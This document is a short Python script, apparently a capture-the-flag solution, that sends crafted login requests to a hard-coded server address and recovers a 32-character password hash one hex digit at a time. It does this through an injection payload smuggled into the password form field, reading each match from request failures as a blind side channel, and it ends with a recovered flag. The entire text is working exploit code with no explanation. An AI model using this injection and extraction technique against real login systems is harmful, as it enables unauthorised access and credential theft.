import requests

lt = "0123456789abcdef"

data = "username=admin&password=y&|hex_md5(.)(.)y.(.)....this.password_(\w%2b)|=$2%3d%3d$2$2+%26%26+this.password_$4[{x}]%3d%3d'{y}'+%26%26+xxx$11000$3+%26%26+$2$2%3d%3d$2"

res = ""
for i in range(32):
    for c in lt:
        j = 0
        xx = False
        while True:
            j+=1
            try:
                payload = data.format(x=i, y=c)
                r = requests.post("http://202.120.7.194:8081/check", data=payload, headers={"Content-Type": "application/x-www-form-urlencoded"})
                break
            except:
                if j==3:
                    res += c
                    print res
                    xx = True
                    break

        if xx:
            break


# flag{13fc892df79a86494792e14dcbef252a}
